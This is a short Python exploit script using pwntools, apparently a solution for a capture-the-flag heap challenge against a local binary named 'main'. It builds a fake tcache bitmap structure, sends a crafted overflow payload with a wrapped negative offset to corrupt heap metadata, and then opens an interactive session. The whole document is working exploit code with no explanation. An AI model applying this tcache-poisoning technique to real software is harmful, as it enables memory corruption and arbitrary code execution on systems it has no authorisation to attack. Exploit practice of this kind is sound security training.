from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./main')
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
gdb.attach(p,'''
b *0x5555555552ae
c
''')
def buildBitMap(idx,target):
    arr = [0]*0x40
    arr[idx]= 1
    res = b''
    for x in range(0x40):
        res+=p16(arr[x])
    rrr = [0]*0x40
    rrr[idx] = target
    return res+flat(rrr[:idx+1])
offset = 0x1f0+0x18
pay = b"\0"*0x80
tcache_idx = 0
payload_size = (0x80-tcache_idx*2)+tcache_idx*8+8
pay = pay.ljust(0x400-offset+4-payload_size)+buildBitMap(tcache_idx,0xdeadbeef000).rjust(payload_size,b'\0')
pad = b'\0'*(offset-4)
print(len(pay+pad))
p.send(pay+pad+p32(0x100000000-offset)+b'A'*0x80)
p.interactive()
